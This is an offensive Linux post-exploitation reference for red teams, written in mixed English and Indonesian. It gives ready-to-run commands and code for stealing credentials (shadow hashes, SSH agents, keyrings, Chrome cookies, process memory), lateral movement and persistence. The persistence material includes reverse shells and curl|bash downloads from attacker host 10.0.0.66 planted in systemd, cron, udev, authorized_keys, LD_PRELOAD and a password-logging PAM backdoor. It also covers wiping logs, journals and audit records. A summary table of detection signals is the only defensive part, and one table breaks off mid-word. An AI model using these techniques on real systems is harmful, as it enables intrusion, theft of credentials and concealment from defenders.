# postex-linux — linux

# Linux Post-Exploitation — Red Team Reference

## 1. Sumber Kredensial

### 1.1 /etc/shadow

What is sent: read hashes, crack offline.
What appears: `$6$` SHA-512 (modern default), `$y$` yescrypt (Debian 12+, RHEL 9+), `$2b$` bcrypt.
Why it works: only root can read; if already root, hash = potential credentials for password reuse on other hosts.

```bash
# Cek tipe hash & umask file
stat -c '%a %U:%G' /etc/shadow
cut -d: -f1,2 /etc/shadow | awk -F: '$2!="!" && $2!="*" && $2!="" {print}'

# Cracking
unshadow /etc/passwd /etc/shadow > /tmp/u.txt
hashcat -m 1800 /tmp/u.txt rockyou.txt -r rules/best64.rule   # sha512crypt
hashcat -m 3200 /tmp/u.txt rockyou.txt                          # bcrypt
john --wordlist=rockyou.txt --format=sha512crypt /tmp/u.txt
```

Trap: `!` and `*` = locked accounts; don't waste time cracking. yescrypt is already default in Ubuntu 22.04+ (`$y$`) — hashcat supports via `-m 31600` but slow.

### 1.2 Shell history

| File | Owner | Contents | Notes |
|---|---|---|---|
| `~/.bash_history` | user | bash commands | written on shell exit, not live |
| `~/.zsh_history` | user | zsh commands | `EXTENDED_HISTORY` may include timestamp |
| `~/.python_history` | user | REPL | sering kredensial inject via `requests` |
| `~/.mysql_history` | user | query | `IDENTIFIED BY 'pass'` muncul plaintext |
| `~/.psql_history` | user | query | `CREATE USER ... PASSWORD` |
| `~/.lesshst`, `~/.viminfo`, `~/.wget-hsts` | user | path/URL | leak internal hostnames |

```bash
grep -rIiE 'pass|token|secret|api[-_]?key|ssh|mysql -u|curl .*@' \
  /home/*/.*history /root/.*history 2>/dev/null

# Timestamps zsh extended history
grep -E '^: [0-9]+:' /home/*/.zsh_history | head
```

Why it works: user copy-pastes password to command line (mysql, psql, aws cli `--password`, docker login `-p`). Doesn't disappear until user clears.
Fails if: `HISTIGNORE`, `HISTSIZE=0`, `HISTFILE=/dev/null`, or systemd `PrivateTmp` not relevant here — but remote shell via `ssh host cmd` does **not** write history.

### 1.3 SSH agent socket

What is sent: forward/abuse the victim user's `SSH_AUTH_SOCK`.
What appears: `ssh-add -l` lists keys without passphrase prompt.

```bash
# Temukan socket hidup
find /tmp /run/user -type s -name 'agent.*' 2>/dev/null
ls -la /tmp/ssh-*/agent.* 2>/dev/null
env | grep SSH_AUTH_SOCK

# Kalau punya akses sebagai user lain (sudo, su, atau process env leak)
tr '\0' '\n' < /proc/$PID/environ | grep SSH_AUTH_SOCK

# Pakai agent target
export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.12345
ssh-add -l
ssh-add -L   # dump public key untuk fingerprinting / authorized_keys
ssh-add -D   # HATI-HATI: hapus key dari agent, bisa break user
```

Why it works: socket permission 0600 owned by user; if we are already that user (or root), we can use it. Key in agent = key to other hosts without needing private key file.
Fails if: socket stale (ssh-agent process already dead), `ForwardAgent no` on server but agent still exists locally, SELinux `ssh_agent` label mismatch.

```bash
# Exfil seluruh agent: dump key public + sign challenge untuk cek
ssh-add -L > /tmp/keys.txt
# Sign tanpa tahu key (proves access)
echo "test" | ssh-keygen -Y sign -f <(ssh-add -L | head -1) -n file - 2>/dev/null
```

### 1.4 Keyring

| Backend | Location | Encryption | Command |
|---|---|---|---|
| GNOME Keyring | `~/.local/share/keyrings/*.keyring` | login password / kosong | `secret-tool search --all` (butuh D-Bus) |
| KWallet | `~/.local/share/kwalletd/` | kwallet password | `kwallet-query` |
| libsecret generic | `~/.local/share/keyrings/` | sama | `secret-tool lookup ...` |
| pass | `~/.password-store/` | GPG | `gpg -d` per file |
| Chromium cookies/logins (v131) | `~/.config/google-chrome/Default/` | libsecret or `v10` AES-128-CBC key "peanuts" | sqlite3 + python |

```bash
# GNOME keyring dump (butuh sesi D-Bus user)
export $(dbus-launch)
secret-tool search --all service ssh
secret-tool search --all application chrome

# Chrome v131 cookie decrypt (Linux, keyring "peanuts" kalau tanpa keyring)
sqlite3 ~/.config/google-chrome/Default/Cookies \
  "SELECT host_key,name,hex(encrypted_value) FROM cookies WHERE name LIKE '%session%'"
python3 - <<'EOF'
from Crypto.Cipher import AES; import sqlite3, hashlib
k = hashlib.pbkdf2_hmac('sha1', b'peanuts', b'saltysalt', 1, 16)
for host,name,enc in sqlite3.connect('/home/*/x').execute('select host_key,name,encrypted_value from cookies'):
    pt = AES.new(k, AES.MODE_CBC, b' '*16).decrypt(enc[3:])
    print(host, name, pt[:-pt[-1]])
EOF
```

Why it fails: keyring locked during non-graphical login (SSH); `secret-tool` needs active `DBUS_SESSION_BUS_ADDRESS` and `gnome-keyring-daemon` — if headless, empty. Chrome 127+ on Linux with active keyring = key in keyring, not "peanuts".

### 1.5 /proc/kcore

What is sent: read entire kernel memory (ELF core, ~128 TB sparse).
What appears: strings from page cache, including passwords read from files, SSH keys, tokens.
Why it works: root + `/proc/kcore` readable (mode 0400). Can `grep -a` because sparse.
Fails if: kernel `CONFIG_STRICT_DEVMEM`, `/proc/kcore` permission 0400 owned by root — root only, and LSM (SELinux `kernel_read_system_state`) blocks container. In modern containers `/proc/kcore` usually **not** mounted.

```bash
# Scan (root, host, bukan container)
grep -aoE '(BEGIN OPENSSH PRIVATE KEY|AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36})' \
  /proc/kcore 2>/dev/null | sort -u | head

# Snapshot spesifik — cari SSH key di memory ssh-agent/sshd
gcore -o /tmp/sshd $(pgrep -o sshd)   # butuh gdb
strings /tmp/sshd.* | grep -E 'BEGIN .* PRIVATE KEY' -A50
```

More reliable alternative in the field: `/proc/<pid>/mem` via `gcore` or `dd` at `[heap]` offset, and `/proc/<pid>/maps` for target process.
Big trap: `grep` on `/proc/kcore` can OOM/abort because 128 TB sparse — use `dd bs=1M skip=N count=M` per range from `/proc/iomem`, or limit with `timeout 60 grep -a -m1 ...`.

---

## 2. LOTL Enumeration

Living-off-the-land — use legitimate binaries for host profiling & lateral readiness.

```bash
# Identitas & distro
cat /etc/os-release; uname -a; getenforce 2>/dev/null; aa-status 2>/dev/null

# Sudo tanpa prompt password
sudo -n -l 2>/dev/null

# SUID / SGID / cap
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null
getcap -r / 2>/dev/null

# Cron & timer systemd
ls -la /etc/cron.* /var/spool/cron/* 2>/dev/null
systemctl list-timers --all --no-pager

# Proses & env (leak kredensial)
ps -eo pid,user,args --sort=-%mem | head -30
tr '\0' '\n' < /proc/1/environ

# Mount & share (cari NFS no_root_squash, CIFS creds)
mount; cat /etc/fstab; cat /proc/mounts
find / -xdev -name '.credentials' -o -name 'id_rsa' 2>/dev/null

# Network & pivot
ss -tunap; ip -br a; cat /etc/resolv.conf
ssh -oBatchMode=yes -oConnectTimeout=3 user@10.0.0.5 true  # reachability

# Container awareness
ls -la /.dockerenv 2>/dev/null; cat /proc/1/cgroup | head
capsh --print 2>/dev/null | head
```

| Binary LOTL | Kegunaan |
|---|---|
| `gdb` / `gcore` | dump memory proses (kredensial sshd, agent) |
| `strace -p` | lihat syscall auth (root) |
| `journalctl -u ssh` | source IP of logins, users that succeeded |
| `last`, `lastlog`, `wtmp` | timeline user |
| `sshd -T` (root) | active sshd configuration |
| `openssl s_client` | exfil via TLS |
| `busctl` / `gdbus` | abuse D-Bus for keyring/systemd |
| `nsenter -t 1 -m` (cap SYS_ADMIN) | escape container |

Why it works: these binaries are allowed by EDR by default. Fails if: auditd rule `-w /usr/bin/gdb` or `-w /proc/*/mem`, and SELinux `deny` for `ptrace` (`allow ptrace` revoked).

---

## 3. Lateral via SSH Agent Hijack & ControlMaster

### 3.1 Agent hijack

```bash
# Skenario: kita dapat shell sebagai user bob, agent bob forward dari laptop
echo $SSH_AUTH_SOCK                     # /tmp/ssh-XXXX/agent.N
ssh-add -l                              # fingerprint key bob
ssh-add -L >/tmp/k.pub
# Cari host tujuan yang menerima key ini
SSH_AUTH_SOCK=$SSH_AUTH_SOCK ssh -oBatchMode=yes bob@10.10.10.20 hostname
```

Why it works: `ForwardAgent yes` on bob's laptop forwards agent to jump server. Key never touches disk on jump host, but the socket exists and can be used by the user who achieved RCE on jump.
Fails if: `ForwardAgent no` (default Ubuntu 22.04+ in ClientAlive?), or `AllowAgentForwarding no` on intermediate destination server.

### 3.2 ControlMaster hijack

What is sent: attach to existing mux socket and authenticate.
What appears: shell to destination host **without** any credentials.

```bash
# Temukan mux socket
find /tmp -type s -name 'ssh-*' 2>/dev/null
find ~ -type s -name 'cm-*' 2>/dev/null
ls -la ~/.ssh/ 2>/dev/null | grep -iE 'master|cm-'
# Baca config untuk path ControlPath
grep -rE 'ControlPath|ControlMaster|ControlPersist' ~/.ssh/config /etc/ssh/ssh_config 2>/dev/null

# Reuse
ssh -o ControlPath=/tmp/ssh-mux-abc123 -o ControlMaster=no user@target hostname
# atau langsung ke socket
SSH="/usr/bin/ssh -S /tmp/ssh-mux-abc123"
$SSH -O check target
$SSH target id
```

Why it works: mux socket default `~/.ssh/` mode 0600 or `/tmp/ssh-XXXX` — if same uid, can be used without key/password. Auth already completed by master process.
Fails if: `ControlMaster no` in config, or socket owned by another user (perm 0600).

### 3.3 SSH config abuse for lateral persistence

```bash
# Inject ke ~/.ssh/config — ProxyCommand untuk pivot permanen
cat >>~/.ssh/config <<'EOF'
Host *.internal
  ProxyCommand ssh -W %h:%p jumpuser@jump.corp
  StrictHostKeyChecking accept-new
Host *
  ControlMaster auto
  ControlPath ~/.ssh/cm-%r@%h:%p
  ControlPersist 4h
EOF

# authorized_keys command= persistence
echo -n 'command="/bin/sh -c \"bash -i >& /dev/tcp/10.0.0.66/4444 0>&1\"",no-pty,no-port-forwarding ssh-ed25519 AAAA... x@x' >> ~/.ssh/authorized_keys
```

Why it works: no root needed, no cron needed; config read every time user runs ssh. Fails if: user never uses ssh again, or admin uses hardened `AuthorizedKeysFile` + `Restrict` in sshd_config.

---

## 4. Persistence

### 4.1 systemd unit (root)

```bash
cat >/etc/systemd/system/systemd-networkd-wait-online.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/sh -c 'nohup bash -c "bash -i >& /dev/tcp/10.0.0.66/4444 0>&1" &'
EOF
systemctl daemon-reload
```
Or clean timer:
```bash
cat >/etc/systemd/system/atd-metrics.service <<'EOF'
[Unit]
Description=atd metrics
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'curl -s http://10.0.0.66/$(hostname) || true'
EOF
cat >/etc/systemd/system/atd-metrics.timer <<'EOF'
[Timer]
OnBootSec=2min
OnUnitActiveSec=10min
[Install]
WantedBy=timers.target
EOF
systemctl enable --now atd-metrics.timer
```
What appears: `systemctl list-timers`, `journalctl -u atd-metrics`.
Why it fails: `systemd-analyze verify`, EDR on all child-of-systemd, SELinux `init_t` context in `/etc/systemd/system/*.service` — if file not correctly labeled, unit will be rejected. Check `restorecon -v`.

### 4.2 cron & systemd user (non-root)

```bash
# root cron
echo '*/5 * * * * root /usr/bin/curl -s http://10.0.0.66/x | bash' >/etc/cron.d/0hourly-x
chmod 644 /etc/cron.d/0hourly-x

# user cron — nama file harus [a-zA-Z0-9_-]
(crontab -l 2>/dev/null; echo '@reboot (curl -s http://10.0.0.66/x|bash)') | crontab -

# systemd --user (survive logout dengan enable-linger)
systemctl --user enable --now ...   # butuh lingers jika non-session
loginctl enable-linger $USER
```
Fails: `cron.allow` restricts user (RHEL strict), files in `/etc/cron.d/` must be root-owned & mode 0644, `anacron` doesn't run `/etc/cron.d/*`. User cron in container = no cron daemon.

### 4.3 LD_PRELOAD

```bash
# Global via /etc/ld.so.preload
cat >/tmp/evil.c <<'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
__attribute__((constructor)) static void init(){
    if(fork()==0){ execl("/bin/sh","sh","-c","curl -s http://10.0.0.66/$(id -u)",NULL); }
}
EOF
gcc -shared -fPIC -o /lib/x86_64-linux-gnu/evil.so /tmp/evil.c
echo /lib/x86_64-linux-gnu/evil.so >/etc/ld.so.preload
```
Or per-service:
```bash
mkdir -p /etc/systemd/system/ssh.service.d
printf '[Service]\nEnvironment=LD_PRELOAD=/lib/x86_64-linux-gnu/evil.so\n' \
  >/etc/systemd/system/ssh.service.d/override.conf
systemctl daemon-reload && systemctl restart ssh
```
What appears: `cat /proc/<pid>/maps | grep evil`, `ldd`.
Why it fails: `/etc/ld.so.preload` often audited (AIDE/tripwire); setuid binary **ignores** `LD_PRELOAD` (secure-execution) — so don't target `/usr/bin/sudo`; SELinux `deny` for `ld.so.preload` write via `container_t`; modern `sshd` (9.x) no longer sources user `.ssh/environment` LD_PRELOAD by default.

### 4.4 udev

```bash
cat >/etc/udev/rules.d/99-net.rules <<'EOF'
ACTION=="add", SUBSYSTEM=="net", RUN+="/bin/sh -c 'curl -s http://10.0.0.66/up'"
EOF
udevadm control --reload-rules
```
Trigger: `ip link add dummy0 type dummy` (root, CAP_NET_ADMIN).
Why it fails: udev RUN doesn't run interactive shell; needs absolute path; systemd-udevd often hardened with `NoNewPrivileges`, `PrivateTmp`; rule not auto-reloaded if `udevadm` not invoked. Persistence only runs if a udev event occurs — graceful reboot without device insert = no trigger. More reliable: combine with `systemd-udevd` restart or `udevadm trigger --action=add`.

### 4.5 PAM

```bash
# Backdoor PAM di /etc/pam.d/common-auth (Debian) atau system-auth (RHEL)
# sisipkan modul yang log password + spawn shell
sed -i '2i\auth optional pam_exec.so quiet /usr/local/sbin/pamx' /etc/pam.d/common-auth
cat >/usr/local/sbin/pamx <<'EOF'
#!/bin/bash
[ "$PAM_TYPE" = "auth" ] && /bin/sh -c 'cat /proc/self/fd/0 >>/var/log/.p 2>/dev/null'
[ "$PAM_USER" = "root" ] && [ "$PAM_TYPE" = "open_session" ] && /bin/bash -i >& /dev/tcp/10.0.0.66/4444 0>&1
exit 0
EOF
chmod 755 /usr/local/sbin/pamx
```
Why it works: the plaintext password from `pam_unix` is available via `PAM_AUTHTOK` to subsequent modules; `pam_exec` runs as root.
Failure: broken PAM config = total lockout (back up first!). `common-auth` on Ubuntu 24.04 is modified by `pam-auth-update` — overriding via `/etc/pam.d/common-auth` directly risks being overwritten during upgrade. `pam_exec` needs `optional` (if `required` and exit != 0 = lockout). SELinux `pam_t` is very strict; usually requires a custom `.te` policy → almost always fails under default enforcing.

---

## 5. Anti-Forensics

### 5.1 Timestomp

```bash
# Cocokkan mtime/atime file payload dengan file sah
touch -r /bin/ls /opt/.p
# Set eksplisit (ELF/stat hanya simpan ctime jangan diharapkan)
touch -a -m -d '2024-01-15 03:14:15' /opt/.p
# stat untuk verifikasi
stat /opt/.p
```
Hard limit: **ctime cannot be changed** via user-space syscalls (except by manipulating the host journal, requires a filesystem like ext4 with debugfs/filesystem-aware tools → performing writes to the raw block device):
```bash
debugfs -w -R 'set_inode_field /opt/.p ctime 20240115031415' /dev/sda1
```
Why it fails: `debugfs` write = inconsistent journal; ext4 with `metadata_csum` refuses. **Btrfs/XFS** requires `xfs_db`/`btrfs` equivalent. `find -ctime` will still see the original ctime. Don't rely on timestomp against `auditd` — audit stores its own `atime` in the log.

Verify the victim's timestomp:
```bash
find / -xdev -newer /etc/hostname -type f 2>/dev/null -not -path '/proc/*'
```

### 5.2 Log tamper

| Target | Lokasi | Detection |
|---|---|---|
| auth log | `/var/log/auth.log` (Debian), `/var/log/secure` (RHEL) | reload rsyslog/harden |
| journald | `/var/log/journal/*/*.journal` | binary + seal |
| wtmp/btmp/lastlog | `/var/log/wtmp`, `btmp` | struktur utmp |
| audit | `/var/log/audit/audit.log` | `auditd` append-only + `-e 2` |
| bash history | `~/.bash_history` | lihat 5.3 |

```bash
# Hapus jejak IP kita di auth (Debian 12/rsyslog)
sed -i '/10.0.0.66/d' /var/log/auth.log
# JANGAN hapus file — rotasi buat gap
: >/var/log/auth.log

# journald: hapus entry spesifik -> dapat via vacuum atau corrupt
journalctl --rotate
journalctl --vacuum-time=1s
# Atau stop dulu
systemctl stop systemd-journald
rm -rf /var/log/journal/*/*.journal
systemctl start systemd-journald

# auditd (harus root + disable dulu)
auditctl -e 0
> /var/log/audit/audit.log
auditctl -e 1

# utmp/wtmp bersih — hapus sesi kita
utmpdump /var/log/wtmp > /tmp/w.txt
# edit /tmp/w.txt hapus baris user kita, lalu:
utmpdump -r /tmp/w.txt > /var/log/wtmp

# lastlog reset untuk user
lastlog -u user     # lihat
# tidak ada tool reset langsung; rumuskan struct layer
```

Why it fails: `auditd` immutable (`-e 2`) can only be changed by reboot — if `-e 2`, `auditctl -e 0` is **rejected**; the only way = reboot with `audit=0` on the cmdline. `journald` with `Seal=yes` + `systemd-journal-remote` has Forward Secure Sealing — a verifier can detect the gap from `journalctl --verify`. Wtmp modification triggers AIDE checksum. Log forwarder (rsyslog → SIEM) means local deletion doesn't remove the remote copy.

### 5.3 History evasion

```bash
# Sebelum shell exit
unset HISTFILE
HISTFILESIZE=0
# Atau eksplisit overwrite
history -c && history -w
# Hilangkan perintah spesifik (bash)
history -d <N>

# zsh
unset HISTFILE
fc -p   # push ke private history, tidak ditulis ke $HISTFILE
```

Safe practice: run all post-ex in a non-interactive shell with `env -i HISTFILE=/dev/null bash --norc --noprofile -c '...'`, or via `ssh host 'cmd'` (doesn't write history, but **still** lands in auth.log / journald `sshd`).

What shows up: `journalctl _COMM=sshd` will still show `Accepted publickey for ... from 10.0.0.66` — this is the most commonly forgotten. To hide it, `grep -v 10.0.0.66` in the journal is impractical (binary, sealed).

```bash
# Cek sisa: auditd + journald + wtmp tetap record
journalctl -u ssh --since today | grep -E 'Accepted|Failed' | grep -v '10.0.0.1'
```

Bash `PROMPT_COMMAND` evasion:
```bash
PROMPT_COMMAND='history -a >/dev/null; unset HISTFILE; HISTSIZE=0'
```
Fails if the admin sets `chattr +a` on the history file, or an `auditd watch` on `~/.bash_history` (many hardened distros have a `-w ~/.bash_history` rule via `-k history`).

---

## 6. Operational Pitfalls (the ones that make it fail in the field)

1. **`/proc/kcore` in a container**: absent or permission 0400 without CAP_SYS_RAWIO → `grep` empty or EACCES. Always check `/proc/1/cgroup` first before wasting 60 seconds scanning.
2. **`grep` on `/proc/kcore` OOM**: 128 TB sparse file; shell/grep will abort or be OOM-killed. Use `dd bs=1M skip= count=` per `/proc/iomem` range, or target `/proc/<pid>/mem` via `gcore`.
3. **Stale SSH agent socket**: `ssh-add -l` returns "Could not open a connection to your authentication agent" even though the socket exists → agent is dead. Validate the owner PID via `ss -xp | grep agent` before using it.
4. **ControlMaster already reused by someone else**: `-O check` returns "No ControlMaster running" if the master pid is gone; socket file remains. `-S socket -O forward` fails silently. Check `ss -x` for active UNIX sockets.
5. **PAM backdoor = lockout**: `sed -i '2i...'` wrong line → `pam_exec` in the wrong position makes `common-auth` invalid; reboot = can't log in. **Always back up** `cp -a /etc/pam.d/common-auth /root/.bak` and test with `su - user` before logging out.
6. **systemd unit rejected due to SELinux label**: a new `/etc/systemd/system/*.service` file doesn't automatically get `systemd_unit_file_t`; if you create it via redirection (`cat >`), `restorecon -v file` is mandatory. Without it: `Failed to start ...: Access denied`, and `avc: denied` logged in `/var/log/audit/audit.log` — also evidence.
7. **LD_PRELOAD on setuid binaries**: `sudo`, `su`, `passwd`, `ssh` (if setuid) ignore `LD_PRELOAD` due to secure-execution (`AT_SECURE`). Placing `evil.so` in `/etc/ld.so.preload` is only effective for non-setuid processes. `sshd` is run as root **not** via setuid after privilege separation (child = user), so the constructor executes in the child with uid 0 — effective, but subject to `PrivateTmp` and `NoNewPrivileges=yes` in modern default units (RHEL 9, Ubuntu 24.04) which can block it.
8. **udev RUN can't spawn an interactive shell**: minimal environment, PATH=/usr/bin:/bin, `$HOME` unset, 180 s timeout. `bash -i >/dev/tcp` often fails because of udev `PrivateNetwork=yes` in modern systemd-udevd (v252+ default on Fedora 39+/RHEL 9). Alternative: `RUN+="/bin/sh -c 'setsid /usr/local/bin/x &'"` and `x` writes a file, not network.
9. **cron in a container**: no `crond` running. SELinux `container_t` often `deny`s writes to `/etc/cron.d/*`. Fails silently.
10. **`crontab` non-login user**: minimal `SHELL`, `PATH=/usr/bin:/bin` environment. Don't assume `$HOME` or the user's tools are available. Check `journalctl -u cron` for silent failures.
11. **Timestomp ctime**: `touch` can't change ctime. `debugfs set_inode_field` corrupts the ext4 `metadata_csum` checksum (modern default) → FS error and `dmesg` records `EXT4-fs error`. **Don't** do it unless the FS is ext4 without `metadata_csum` and you're prepared to lose data.
12. **`history -c` doesn't delete entries already written by `history -a`**: if `PROMPT_COMMAND='history -a'` (default Ubuntu 22.04+), every command is already flushed to `$HISTFILE`. `history -c` only clears the buffer. You must `history -c; > ~/.bash_history` or `history -d` per line **before** the next flush.
13. **journald sealing**: `Seal=yes` (default on Fedora/RHEL 8+) with `systemd-journal-remote` will verify the HMAC; rm journal → verifier shows a gap and logs "File ... was sealed, but verification failed". Can't be removed without key rotation (which records the event).
14. **auditd `-e 2` immutable**: `auditctl -e 0` is rejected with "Unable to change auditd rate". The only path = reboot with `audit=0`, which leaves traces in the journal/BIOS log and requires physical interaction/host reboot.
15. **`gcore`/`ptrace` disabled**: `/proc/sys/kernel/yama/ptrace_scope=1` (Ubuntu default) restricts ptrace to parent; `gcore` as root still works (CAP_SYS_PTRACE), but **in a container** without CAP_SYS_PTRACE → `ptrace: Operation not permitted`. Check `capsh --print`.
16. **keyring headless**: on non-graphical SSH login, `gnome-keyring-daemon` is not started → `secret-tool` fails (no such file / permission). Dumping the `.keyring` file produces an encrypted blob that requires a password = offline crack, not direct access.
17. **Chrome cookie decrypt changed**: Chrome 127+ on Linux without an active keyring still uses the AES-128-CBC key `peanuts` **only** if there is no secret service backend; if `gnome-keyring` exists and is active (xvfb + dbus), the value is encrypted with a random key in the keyring → also requires `secret-tool`. Chrome 131 on Windows uses `v10` with App-Bound Encryption (AES-256-GCM, key in the `Google Chrome Elevation Service`) → pure cookie theft via file copy **does not work** unless bypass/service abuse.
18. **`authorized_keys` `command=` + `no-pty`**: non-interactive shell persistence; many teams test incorrectly with `ssh host` → get a shell without output (`no-pty`) → looks broken. Test via `ssh user@host 'id'` not a session.
19. **`ssh -oBatchMode=yes`** in a lateral loop will write `Failed publickey` in the target host's auth.log → EDR noise. Replace with `-oLogLevel=ERROR` and `-oPreferredAuthentications=publickey` to reduce it (but it is still logged).
20. **Hostname / DNS in lateral**: `ssh bob@target` resolves via `resolv.conf` which may be internal-only; use the IP from `ss`/`ip route` to avoid silent failure due to DNS timeout.

---

## 7. Summary Table — Detection Signals per Technique

| Technique | Clearly visible artifact | Log source |
|---|---|---|
| /etc/shadow read | atime update (relatime may not) | auditd `-w /etc/shadow -p r` |
| history read | file read | auditd `-w ~/.bash_history -p r` |
| SSH agent hijack | `ssh-add -L`, koneksi keluar inisiatif | `journalctl _COMM=sshd` + NetFlow |
| ControlMaster reuse | new sshd PID without auth log | no `Accepted` in auth.log |
| systemd unit | file baru `/etc/systemd/system/*.service` | AIDE, `systemctl show -p FragmentPath` |
| cron | file `/etc/cron.d/*`, `crontab` write | auditd `-w /var/spool/cron -p wa` |
| LD_PRELOAD | `/etc/ld.so.preload` mtime + proses memetakan `.so` tak lazim | auditd `-w /etc/ld.so.preload` |
| udev | `/etc/udev/rules.d/*.rules` baru | `udevadm monitor` + auditd |
| PAM | `common-auth` mtime, `p

## [continued]

## Advanced credentials

### SSH agent socket — varian & edge case

| Scenario | Detection | Extraction |
|---|---|---|
| `SSH_AUTH_SOCK` alive in victim's shell | `env \| grep SSH_AUTH_SOCK` | `ssh-add -l` via socket |
| Agent forwarding (Attacker→Victim) | `SSH_AUTH_SOCK` in `/tmp/ssh-*/agent.*` owned by the remote user | Reverse forward: `ssh -A victim 'cat'` or `socat UNIX-CONNECT:$SOCK TCP-LISTEN` |
| Agent socket but no key | `ssh-add -l` → "no identities" | Look for keys in `~/.ssh/*`, passphrase-less |
| Stale socket (dead process) | `ss -xp \| grep ssh` empty | Skip; don't waste time |
| OpenSSH ≥ 8.9 | Agent uses systemd user `ssh-agent.socket` | `systemctl --user status ssh-agent` |

```bash
# Hijack agent milik user lain (butuh read pada socket dir, biasanya root)
export SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.NNN
ssh-add -L                    # dump public keys
ssh -T git@github.com         # abuse langsung
# Ekstrak private key dari agent (butuh root + ptrace atau CVE tertentu)
# ssh-agent tidak expose private key via protokol — pakai dump memory:
gdb -p $(pgrep ssh-agent) -batch -ex 'dump memory /tmp/agent.dump 0x0 0xffffffff'
strings /tmp/agent.dump | grep -A2 'BEGIN.*PRIVATE'
```

**Pitfall:** agent forwarding from server A→B; the socket on B is only valid while the SSH session A is alive. `ssh -O check` to check ControlMaster is still active before hijacking.

### ControlMaster hijack

```bash
# Cari socket master
find / -type s -name '*.sock' 2>/dev/null | grep -i ssh
ls -la ~/.ssh/  # cek controlpath (biasanya ~/.ssh/cm-*)
# Pakai tanpa auth
ssh -S /tmp/ssh-cm-user@host:22 -O check host
ssh -S /tmp/ssh-cm-... host 'id'
# Atau: reuse master untuk port forward
ssh -S /tmp/cm-sock -O forward -L 8080:internal:80 host
```

Edge: the master socket is usually mode 0600 owned by the user; it can only be used if you are already that user (post-exploit at user level). For root→another user: `nsenter`/`runuser` is not enough — you need ptrace or a file permission bypass.

### Keyring / secret service

| Backend | Location | How to extract |
|---|---|---|
| GNOME Keyring | `~/.local/share/keyrings/*.keyring` | `secret-tool search --all` (requires the user's D-Bus session), or decrypt offline with the login password |
| KWallet | `~/.local/share/kwalletd/` | `kwallet-query -l` (butuh D-Bus) |
| libsecret via D-Bus | `busctl --user` | `gdbus call --session --dest org.freedesktop.secrets ...` |
| Chromium (Linux) | `~/.config/*/Local State` + `Login Data` | os_crypt v10 = AES-CBC with key from keyring; without keyring plaintext "peanuts" |

```bash
# Keyring unlocked (user login aktif) — context: sudah jadi user itu
secret-tool search --all xdg:schema org.gnome.keyring.NetworkPassword
# Dump semua:
python3 - <<'EOF'
import secretstorage
b=secretstorage.dbus_init()
for c in secretstorage.get_all_collections(b):
    for i in c.get_all_items():
        print(i.get_label(), i.get_attributes(), i.get_secret())
EOF
```

**Pitfall:** keyring is locked if the session is not a graphical login (SSH-only login does not auto-unlock). Check `loginctl show-session` for `Type`/`Active`.

### /proc/kcore & memory

```bash
# Root only, atau user dgn CAP_SYS_RAWIO
ls -la /proc/kcore    # 0400 root
# Ekstrak kredensial dari memory proses target
gcore -o /tmp/dump $(pgrep -u root sshd)
strings /tmp/dump.* | grep -iE 'password|secret|token'
# PAM password di memory sshd saat login (race) — butuh timing
# Lihat juga: /proc/<pid>/mem untuk proses spesifik
dd if=/proc/$PID/mem bs=1 skip=$((0xSTART)) count=$LEN 2>/dev/null
```

Varian kernel ≥ 5.8: `/proc/kcore` bisa dibatasi `CONFIG_STRICT_DEVMEM`/`kernel.kptr_restrict=2`. `kptr_restrict=2` blok `%pK`. Cek `sysctl kernel.kptr_restrict kernel.yama.ptrace_scope`.

### /etc/shadow alternatif

```bash
# Jika root tapi shadow read-only / immutable
getent shadow                  # via NSS — bisa beda dari file
cat /etc/shadow-               # backup
cat /etc/shadow.bak /etc/shadow.old 2>/dev/null
# systemd-homed: kredensial di ~/.identity (LUKS + JSON)
cat /home/*/.identity | jq .
# SSSD cache
ldbsearch -H /var/lib/sss/db/cache_*.ldb 2>/dev/null
# Kerberos keytab
klist -kte /etc/krb5.keytab
```

## LOTL enumeration (existing binaries, without dropping tools)

| Purpose | Binary | Command |
|---|---|---|
| Enum proses+env | `ps`, `tr` | `ps eww -eo pid,user,args` |
| Find credentials in cmdline/env | `grep` | `grep -aiE 'pass\|token\|key' /proc/*/cmdline` |
| Network | `ss -tunap`, `lsof -i` | |
| File baru | `find` | `find / -xdev -mtime -1 -type f 2>/dev/null` |
| Capabilities | `getcap -r /` | |
| SUID | `find / -perm -4000 -type f` | |
| systemd unit | `systemctl list-units --all`, `systemctl cat` | |
| Journal | `journalctl -xe --no-pager` | |
| Cron | `ls -la /etc/cron.*`, `crontab -l` | |
| LXD/Docker | `lxc list`, `docker ps` | |
| Kerberos | `klist` | |
| ACL | `getfacl -R / 2>/dev/null` | |
| Immutable | `lsattr -R /etc 2>/dev/null` | |

**Pitfall:** `find /` can trigger `systemd-oomd`/audit alerts; use `-xdev` and a narrow scope. `getcap -r /` takes a long time — target `$(echo $PATH\|tr : ' ') /usr/local /opt`.

## Lateral movement

### SSH agent hijack (lateral)

```bash
# Dari user A (dengan agent forwarding) → host B
ssh -A victimA                     # forwarding aktif
# Di victimA, socket ada di /tmp/ssh-*/agent.*
# Di attacker, hose socket:
socat UNIX-LISTEN:/tmp/agentsock,fork UNIX-CONNECT:/tmp/ssh-XXXX/agent.123 &
export SSH_AUTH_SOCK=/tmp/agentsock
ssh-add -l                         # key milik attacker/original
ssh userB@hostB 'id'               # login sebagai userB via forwarded key
```

### ControlMaster reuse

```bash
# Master socket di host korban memungkinkan reuse tanpa auth ulang
ssh -S ~/.ssh/cm-* -O forward -R 4444:localhost:22 victim
# Tunnel ke internal
ssh -S ~/.ssh/cm-* -O forward -L 0.0.0.0:8080:internal.svc:80 victim
```

**Varian OpenSSH 9.x:** `controlpath` default `~/.ssh/cm-%r@%h:%p`; hash jika `%C`. Cari pola `cm-*`, `*.sock`.

## Advanced persistence

### systemd — varian & edge

| Tipe | Lokasi | Trigger | Jebakan |
|---|---|---|---|
| System unit | `/etc/systemd/system/*.service` | reboot + daemon-reload | `daemon-reload` requires root |
| User unit | `~/.config/systemd/user/` | login | `loginctl enable-linger` to persist beyond the session |
| Timer | `*.timer` + `*.service` | schedule | `OnCalendar=` — cek `systemd-analyze calendar` |
| Path unit | `*.path` | file event | `PathExists=/tmp/x` |
| Generator | `/etc/systemd/system-generators/` | boot | executable, root |
